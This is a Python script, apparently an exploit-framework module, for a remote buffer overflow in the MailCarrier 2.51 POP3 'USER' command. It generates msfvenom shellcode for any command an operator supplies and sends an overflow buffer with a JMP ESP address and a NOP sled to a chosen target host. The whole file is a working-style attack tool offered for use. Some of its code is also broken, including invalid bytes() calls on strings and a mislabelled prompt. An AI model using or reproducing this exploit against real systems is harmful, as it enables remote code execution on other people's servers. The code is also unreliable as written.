import socket
import time
import os


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    green = '\033[0;32m'
    end = '\033[m'


class Exploit(object):
    def __init__(self, command, remote_host, remote_port):
        self.command = command
        self.remote_host = remote_host
        self.remote_port = int(remote_port)

    def send_remote_buffer_overflow(self, timeout):
        os.system(f"msfvenom -p windows/exec cmd={self.command} -f py -b '\x00\x0a\x0d' -o shellcode")
        buf = open("shellcode", "r").read()
        jmp_esp = '\x23\x49\xA1\x0F'
        buffer = b"\x41" * 5095 + bytes(jmp_esp) + b"\x90" * 20 + bytes(buf) + b"\x43" * (5096 - 4 - 20 - 1730)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.remote_host, self.remote_port))
            print(f"{Colors.green}Sending Payload To Machine...{Colors.end}")
            time.sleep(int(timeout))
            data_returned_one = sock.recv(1024).decode()
            print(str(data_returned_one))
            sock.send(b"USER " + buffer + bytes("\r\n"))
            data_returned_two = sock.recv(1024).decode()
            print(str(data_returned_two))
            sock.send(b"QUIT" + bytes("\r\n"))
            sock.close()
            print(f"{Colors.green}success! command sent...{Colors.end}")
        except socket.error as message:
            print(f"{Colors.red}error occurred! \n{Colors.end}" + "\r %s" % message)


options = \
    """
Variables               Description                                         Needed
---------               -----------                                         ------
command                 malicious command to execute on the machine          yes
remote_host             remote ip address of the target machine              yes
remote_port             pop3 remote port (target port)                       yes

(examples)
    set command id
    set remote_host 127.0.0.1
    set remote_port 110
    run / exploit
"""


def interaction():
    while True:
        module = input(f"{Colors.red}(Windows 10 MailCarrier 2.51 POP3 'USER' Remote Buffer Overflow){Colors.end} [MODULE]:~#")
        if module == "help" or module == "options":
            print(options)
        elif module == "exit" or module == "back":
            break
        elif "set command " in module:
            cmd = module[12:]
            print(f"remote_host: {Colors.green + cmd + Colors.end}")
        elif "set remote_host " in module:
            r_host = module[16:]
            print(f"remote_host: {Colors.green + r_host + Colors.end}")
        elif "set remote_port " in module:
            r_port = module[16:]
            print(f"remote_port: {Colors.green + r_port + Colors.end}")
        elif module == "run" or module == "exploit":
            attack = Exploit(command=cmd, remote_port=r_port, remote_host=r_host)
            attack.send_remote_buffer_overflow(timeout=2)


if __name__ == "__main__":
    interaction()
